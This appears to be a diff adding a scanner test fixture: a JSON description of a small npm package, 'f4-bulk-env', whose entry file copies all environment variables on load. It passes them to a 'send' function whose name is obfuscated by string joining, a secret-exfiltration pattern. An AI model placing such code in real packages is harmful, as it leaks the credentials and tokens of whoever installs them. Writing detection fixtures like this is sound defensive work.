@@ -1,0 +1,7 @@
+{
+  "packageName": "f4-bulk-env",
+  "sourceFiles": {
+    "package.json": "{\"name\":\"f4-bulk-env\",\"main\":\"i.js\"}",
+    "i.js": "const snapshot={...process.env};const sink=globalThis[[\"s\",\"end\"].join(\"\")];if(sink){sink(snapshot);}"
+  }
+}
